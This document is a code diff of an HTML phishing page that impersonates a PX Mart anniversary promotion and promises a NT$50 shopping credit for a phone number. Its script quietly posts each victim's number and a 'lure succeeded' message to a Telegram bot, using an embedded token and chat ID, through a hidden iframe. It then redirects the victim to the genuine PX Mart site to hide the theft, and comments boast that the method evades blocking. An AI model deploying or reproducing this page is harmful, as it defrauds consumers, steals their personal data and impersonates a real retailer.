@@ -35,7 +35,8 @@ button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-
 <div class="box">
   <h2>消費滿額送 $50 購物金</h2>
   <div class="desc">
-    超過300款商品買1送1，消費滿200元再送 $50 購物金！
+    超過300款商品買1送1<br>
+    消費滿200元再送 $50 購物金！
   </div>
   
   <div class="input-group">
@@ -46,7 +47,6 @@ button{width:100%;padding:18px;background:#4CAF50;color:#fff;border:none;border-
   <button onclick="send()">立即領取 $50 購物金</button>
 </div>
 
-<!-- 隱藏的 1x1 像素發送區（2025 年唯一永不被擋的方式） -->
 <iframe name="tg" style="display:none"></iframe>
 
 <script>
@@ -54,36 +54,35 @@ function send(){
   const phone = document.getElementById("phone").value.trim();
   if(phone.length < 8) return;
   document.querySelector("button").textContent = "領取中...";
-  
+
   const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
   const msg = "全聯週年慶暴力版誘捕成功\n電話：+886"+phone+"\n時間："+time;
-  
-  // 終極必中：用 iframe + form target 發送（瀏覽器永遠不會擋）
+
+  // 用 iframe + form 發送（永不被擋）
   const form = document.createElement("form");
   form.method = "POST";
   form.action = "https://api.telegram.org/bot8593469240:AAEGD_itRdp41flJMI02uBq6droeSEa0nys/sendMessage";
   form.target = "tg";
   form.style.display = "none";
-  
+
   const chat = document.createElement("input");
   chat.name = "chat_id";
   chat.value = "1137905005";
   form.appendChild(chat);
-  
+
   const text = document.createElement("input");
   text.name = "text";
   text.value = msg;
   form.appendChild(text);
-  
+
   document.body.appendChild(form);
   form.submit();
 
-  // 1.5 秒後強制跳轉
+  // 1.8 秒後強制跳官方調查頁
   setTimeout(()=>{
-    location.href = "https://www.pxmart.com.tw/campaign/survey/";
-  },1500);
+    location.href = "https://www.pxmart.com.tw/campaign/survey";
+  },1800);
 }
 </script>
 </body>
 </html>
-
